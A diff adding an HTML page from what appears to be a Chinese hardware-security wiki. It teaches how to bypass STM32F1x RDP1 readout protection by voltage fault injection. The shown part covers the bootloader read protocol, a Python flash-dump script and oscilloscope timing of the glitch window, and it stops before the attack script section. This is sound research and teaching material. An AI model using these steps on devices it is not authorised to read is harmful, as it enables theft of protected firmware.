@@ -1,0 +1,1236 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+        <meta name="author" content="yichen">
+      
+      
+        <link rel="canonical" href="https://yichen115.github.io/%E6%95%85%E9%9A%9C%E6%A1%88%E4%BE%8B/STM32F1x%20%E7%94%B5%E5%8E%8B%E6%95%85%E9%9A%9C%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%20RDP1%20%E5%9B%BA%E4%BB%B6%E8%AF%BB%E4%BF%9D%E6%8A%A4/">
+      
+      
+        <link rel="prev" href="../../%E4%B8%8A%E6%89%8B%E6%8C%87%E5%8D%97/PowerShorter%E5%BC%80%E7%AE%B1%E4%B8%8E%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/">
+      
+      
+        <link rel="next" href="../nRF52%20%E7%94%B5%E5%8E%8B%E6%95%85%E9%9A%9C%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%20APPROTECT%20%E5%9B%BA%E4%BB%B6%E8%AF%BB%E4%BF%9D%E6%8A%A4/">
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.50">
+    
+    
+      
+        <title>STM32F1x 电压故障注入绕过 RDP1 固件读保护 - 故障注入wiki 测试</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.a40c8224.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/extra.css">
+    
+      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lxgw-wenkai-webfont@1.1.0/style.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="red" data-md-color-accent="red">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#_1" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="页眉">
+    <a href="../.." title="故障注入wiki 测试" class="md-header__button md-logo" aria-label="故障注入wiki 测试" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            故障注入wiki 测试
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              STM32F1x 电压故障注入绕过 RDP1 固件读保护
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+    
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="查找">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="分享" aria-label="分享" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="清空当前内容" aria-label="清空当前内容" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+    
+      
+<nav class="md-tabs" aria-label="标签" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../.." class="md-tabs__link">
+        
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../%E4%B8%8A%E6%89%8B%E6%8C%87%E5%8D%97/PowerShorter%E5%BC%80%E7%AE%B1%E4%B8%8E%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/" class="md-tabs__link">
+          
+  
+    
+  
+  上手指南
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="./" class="md-tabs__link">
+          
+  
+    
+  
+  故障案例
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+    
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="导航栏" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="故障注入wiki 测试" class="md-nav__button md-logo" aria-label="故障注入wiki 测试" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    故障注入wiki 测试
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Home
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    上手指南
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            上手指南
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E4%B8%8A%E6%89%8B%E6%8C%87%E5%8D%97/PowerShorter%E5%BC%80%E7%AE%B1%E4%B8%8E%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    PowerShorter开箱与简单使用
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+      
+        
+        
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    故障案例
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            故障案例
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    STM32F1x 电压故障注入绕过 RDP1 固件读保护
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    STM32F1x 电压故障注入绕过 RDP1 固件读保护
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      相关工具及环境
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="相关工具及环境">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      推荐硬件设备清单
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      软件清单
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#rdp" class="md-nav__link">
+    <span class="md-ellipsis">
+      RDP 介绍与开启
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="RDP 介绍与开启">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#rdp_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      RDP 级别定义
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rdp_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      RDP 开启与关闭
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#stm32-uart-bootloader" class="md-nav__link">
+    <span class="md-ellipsis">
+      STM32 Uart Bootloader 介绍与使用
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="STM32 Uart Bootloader 介绍与使用">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#uart-botloader" class="md-nav__link">
+    <span class="md-ellipsis">
+      Uart Botloader 介绍与连接
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#uart-bootloader" class="md-nav__link">
+    <span class="md-ellipsis">
+      Uart Bootloader 通信协议
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#uart-bootloader_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      故障 Uart Bootloader
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#stm32f1x-rdp1" class="md-nav__link">
+    <span class="md-ellipsis">
+      故障注入绕过STM32F1x RDP1
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="故障注入绕过STM32F1x RDP1">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      电压毛刺注入物理位置
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      去电容提高成功率
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      故障注入时遇到的问题
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      硬件接线参考
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      成功波形参考
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    <span class="md-ellipsis">
+      攻击脚本参考
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../nRF52%20%E7%94%B5%E5%8E%8B%E6%95%85%E9%9A%9C%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%20APPROTECT%20%E5%9B%BA%E4%BB%B6%E8%AF%BB%E4%BF%9D%E6%8A%A4/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    nRF52 电压故障注入绕过 APPROTECT 固件读保护
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      相关工具及环境
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="相关工具及环境">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      推荐硬件设备清单
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      软件清单
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#rdp" class="md-nav__link">
+    <span class="md-ellipsis">
+      RDP 介绍与开启
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="RDP 介绍与开启">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#rdp_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      RDP 级别定义
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rdp_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      RDP 开启与关闭
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#stm32-uart-bootloader" class="md-nav__link">
+    <span class="md-ellipsis">
+      STM32 Uart Bootloader 介绍与使用
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="STM32 Uart Bootloader 介绍与使用">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#uart-botloader" class="md-nav__link">
+    <span class="md-ellipsis">
+      Uart Botloader 介绍与连接
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#uart-bootloader" class="md-nav__link">
+    <span class="md-ellipsis">
+      Uart Bootloader 通信协议
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#uart-bootloader_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      故障 Uart Bootloader
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#stm32f1x-rdp1" class="md-nav__link">
+    <span class="md-ellipsis">
+      故障注入绕过STM32F1x RDP1
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="故障注入绕过STM32F1x RDP1">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      电压毛刺注入物理位置
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      去电容提高成功率
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      故障注入时遇到的问题
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      硬件接线参考
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      成功波形参考
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    <span class="md-ellipsis">
+      攻击脚本参考
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+  <h1>STM32F1x 电压故障注入绕过 RDP1 固件读保护</h1>
+
+<h2 id="_1">相关工具及环境</h2>
+<h3 id="_2">推荐硬件设备清单</h3>
+<ul>
+<li>STM32F103 核心板（Blue Pill）</li>
+<li>STLink</li>
+<li>Pico 示波器</li>
+<li>PowerShorter 电压短路故障注入设备</li>
+<li>USB 转 TTL 小板</li>
+<li>杜邦线若干</li>
+</ul>
+<h3 id="_3">软件清单</h3>
+<ul>
+<li><a href="https://www.picotech.com/downloads">Pico 示波器软件</a></li>
+<li><a href="https://www.st.com.cn/zh/development-tools/stm32cubeprog.html">STM32CubeProgrammer</a></li>
+</ul>
+<hr />
+<h2 id="rdp">RDP 介绍与开启</h2>
+<p>为了保护芯片内的固件不被攻击者获取，ST 给芯片设计了固件读保护机制（Readout Protection）简称 RDP</p>
+<h3 id="rdp_1"><strong>RDP 级别定义</strong></h3>
+<ul>
+<li>Level 0：无任何保护，默认的 RDP 级别，仅适用于开发和调试  </li>
+<li>Level 1：禁用部分调试功能，无法通过调试接口访问 Flash，但可以读取 SRAM  </li>
+<li>Level 2：完全禁用调试，禁止读写任何资源，大部分型号无法回退</li>
+<li>Level 0.5：适用于启用 TrustZone 的 STM32 MCU，仅限制对安全世界的调试访问，允许访问非安全世界</li>
+</ul>
+<h3 id="rdp_2">RDP 开启与关闭</h3>
+<table>
+<thead>
+<tr>
+<th>STM32</th>
+<th>ST-Link</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>3V3</td>
+<td>3.3V</td>
+</tr>
+<tr>
+<td>GND</td>
+<td>GND</td>
+</tr>
+<tr>
+<td>SWCLK</td>
+<td>SWCLK</td>
+</tr>
+<tr>
+<td>SWO</td>
+<td>SWDIO</td>
+</tr>
+</tbody>
+</table>
+<p>使用 ST-Link 连接 STM32 的 SWD 接口</p>
+<p><img alt="image-20241210115312717" src="../img/image-20241210115312717.png" /></p>
+<p>打开 STM32CubeProgrammer 连接成功后点击左侧【OB】选项进入选项字节（Option Bytes）配置页面，勾选 RDP 保护，点击 Apply 应用即可开启 RDP</p>
+<p><img alt="image-20241210115219965" src="../img/image-20241210115219965.png" /></p>
+<p>关闭 RDP1 与开启路径相同，在 Option bytes 选项字节中将 RDP 取消勾选并应用，将 RDP 关闭，此后可以读取 Flash 中的内容，但 Flash 被清空</p>
+<p><img alt="image-20241210115351873" src="../img/image-20241210115351873.png" /></p>
+<hr />
+<h2 id="stm32-uart-bootloader">STM32 Uart Bootloader 介绍与使用</h2>
+<h3 id="uart-botloader">Uart Botloader 介绍与连接</h3>
+<p>根据 <a href="https://www.st.com/resource/en/reference_manual/rm0008-stm32f101xx-stm32f102xx-stm32f103xx-stm32f105xx-and-stm32f107xx-advanced-armbased-32bit-mcus-stmicroelectronics.pdf">STM32F1XXX 参考手册(P60)</a>，STM32F103 根据 BOOT 引脚的电平状态，共有三种启动模式，根据 <a href="https://www.st.com/resource/en/datasheet/stm32f103c8.pdf">STM32 Datasheet(P15)</a> System meoery 中存放的是 bootloader，这部分是芯片在制造阶段烧进去的，是一段只读（不可更改）的代码</p>
+<p>这段代码的主要作用为通过串口对 STM32 的 Flash 进行擦除和写入。即可以在板级上进行编程，而不用把芯片拆下来放到烧写器中，所以称作“在系统编程” ISP（In-System Programming）要使用 UART Bootloader 功能要切换到 System memory 启动，即 BOOT0 要设置为 1，BOOT1 要设置为 0</p>
+<p>因此将 BOOT0 跳线帽接到 1；BOOT1 跳线帽接到 0 切换到 Bootloader 启动</p>
+<p><img alt="image-20241210115854303" src="../img/image-20241210115854303.png" /></p>
+<p>按照如下线序将 STM32 与串口小板连接在一起，将串口小板插到电脑 USB 接口，打开 CubeProgrammer 选择 UART 进行连接（如果未开启 RDP，应该读出了 Flash 数据）</p>
+<table>
+<thead>
+<tr>
+<th><strong>STM32</strong></th>
+<th><strong>USB TO TTL</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>3V3</strong></td>
+<td><strong>3V3</strong></td>
+</tr>
+<tr>
+<td><strong>GND</strong></td>
+<td><strong>GND</strong></td>
+</tr>
+<tr>
+<td><strong>A9</strong></td>
+<td><strong>RXD</strong></td>
+</tr>
+<tr>
+<td><strong>A10</strong></td>
+<td><strong>TXD</strong></td>
+</tr>
+</tbody>
+</table>
+<p><img alt="image-20241210115909310" src="../img/image-20241210115909310.png" /></p>
+<h3 id="uart-bootloader">Uart Bootloader 通信协议</h3>
+<p>ST 对于 UART Bootloader 的通信协议有一份详细的文档，这将成为我们突破 RDP 的关键：<a href="https://www.st.com/resource/en/application_note/cd00264342-usart-protocol-used-in-the-stm32-bootloader-stmicroelectronics.pdf">protocol in stm32 bootloader</a></p>
+<p><img alt="image-20241210120046613" src="../img/image-20241210120046613.png" /></p>
+<p>通过探索该文档，发现 0x11 这条命令是用来通过 Uart Bootloader 读取内存的，<a href="https://www.st.com/resource/en/application_note/cd00264342-usart-protocol-used-in-the-stm32-bootloader-stmicroelectronics.pdf">根据手册 P15 和 P16</a> 中的描述，流程为：</p>
+<p>1、发送 0x11 及其反码校验 0xEE</p>
+<p>2、收到 ACK 再发送要读取的地址，该地址格式为四个字节的大端序，且互相异或得出一个字节的校验和</p>
+<p>3、收到 ACK 后发送 Size 及其反码校验和，<font size=2>Size为实际要读的大小减一</font></p>
+<p>4、收到 ACK 后，接收读回来的数据</p>
+<p>每次读取最多 256 个字节数据，但是可以写个循环多次读取</p>
+<p><img alt="image-20241210120144289" src="../img/image-20241210120144289.png" /></p>
+<p>因此编写脚本尝试通过 Uart Bootloader 读取 flash 中的内容：</p>
+<pre><code class="language-py">import serial # 导入串口库
+import struct
+
+# 初始化串口，校验格式为偶校验
+s = serial.Serial(&quot;COM52&quot;,115200,parity=serial.PARITY_EVEN,timeout=0.5)
+
+s.write(b&quot;\x7F&quot;) # 发送 0x7F
+recv = s.read(1)
+print(&quot;0x7F ack: &quot;,recv.hex())
+
+s.write(b&quot;\x11\xEE&quot;) # 发送 0x11 read memory
+recv = s.read(1)
+print(&quot;0x11 ack: &quot;,recv.hex())
+
+addr = 0x08000000
+a = struct.pack('&gt;I',addr) # 大端序
+x = struct.pack('B',(a[0] ^ a[1] ^ a[2] ^ a[3])) # 计算校验和
+address = a + x
+
+s.write(address) # 发送 address
+recv = s.read(1)
+print(&quot;address ack: &quot;,recv.hex())
+
+s.write(b&quot;\xFF\x00&quot;) # 发送 size 0xFF
+recv = s.read(1)
+print(&quot;size ack: &quot;,recv.hex())
+
+flash = s.readall()
+print(&quot;Read back Flash: &quot;,flash.hex())
+</code></pre>
+<p><img alt="image-20241210123209084" src="../img/image-20241210123209084.png" /></p>
+<h3 id="uart-bootloader_1">故障 Uart Bootloader</h3>
+<p>但当开启 RDP 后仍然无法通过该方法读取固件，值得注意的是：开启 RDP1 后 Bootloader 并不是完全拒绝响应的，当我们使用 0x7F 激活 bootloader 时仍然回复了 0x79，等到 0x11 请求读取 Flash 时才会返回 0x1F 那是不是有可能意味着：<font color=red><strong>每次发送 0x11 时 Bootloader 都会先检查 RDP1 是否开启，再决定是否可以执行读取 Flash 的操作呢？</strong></font></p>
+<p>使用示波器抓取读取 Flash 的 UART 通信过程，并添加串行译码解析 UART 通信，选择偶校验</p>
+<p><img alt="image-20241210123714353" src="../img/image-20241210123714353.png" /></p>
+<p>图中红色波形为 PA10；蓝色波形为 PA9，通过示波器波形图中的虚线标尺可以看到，发送完 \x11\xEE 大约 14.44us 返回了 \x1F，如果真如我们所想，那么校验逻辑一定在这期间，我们可以在这期间进行故障注入，根据 UART 协议，read memory 命令会产生 6 次上升沿，只要在 PA10 发送 \x11\xEE 造成的第六次上升沿后的 14.44us 内注入故障就有可能绕过 RDP 的检查</p>
+<p><img alt="image-20241210123741010" src="../img/image-20241210123741010.png" /></p>
+<hr />
+<h2 id="stm32f1x-rdp1">故障注入绕过STM32F1x RDP1</h2>
+<h3 id="_4">电压毛刺注入物理位置</h3>
+<p>查阅 <a href="https://www.st.com/resource/en/datasheet/cd00161566.pdf">STM32F103 的芯片手册</a>，F103芯片有多个供电引脚，这些直接接到了开发板的 3.3V 上，因此我们直接对开发板的供电引脚进行电压短路故障注入</p>
+<h3 id="_5">去电容提高成功率</h3>
